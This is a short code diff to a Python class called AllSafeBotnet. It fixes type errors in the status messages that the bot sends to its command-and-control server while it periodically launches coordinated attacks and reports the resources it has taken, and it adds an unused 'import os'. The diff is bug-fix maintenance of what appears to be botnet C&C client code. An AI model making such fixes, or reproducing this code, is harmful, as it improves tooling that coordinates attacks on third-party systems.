@@ -10,6 +10,7 @@ from multiprocessing import Process, Queue
 from time import sleep as threadSleep
 
 from utils.log import logCCUpdate
+import os
 
 from Worker import AllSafeWorkerMaster
 
@@ -75,11 +76,11 @@ class AllSafeBotnet():
                 id, resources, counter = self.attack(configuration, override=True)
             # periodically check for C&C to carry a coordinated attack
             else:
-                up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + self._attack_counter + "executing")
+                up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + str(self._attack_counter) + "executing")
                 if up:
                     try:
                         id, resources, counter = self.attack(configuration, override=False)
-                        logCCUpdate(server, id, "attack n. " + str(counter) + " (failed " + self._attempt_counter + " times)" + "\n" + str(json.dumps(resources, indent=4)))
+                        logCCUpdate(server, id, "attack n. " + str(counter) + " (failed " + str(self._attempt_counter) + " times)" + "\n" + str(json.dumps(resources, indent=4)))
                         self._attempt_counter = 0
                     except Exception:
                         self._attempt_counter += 1
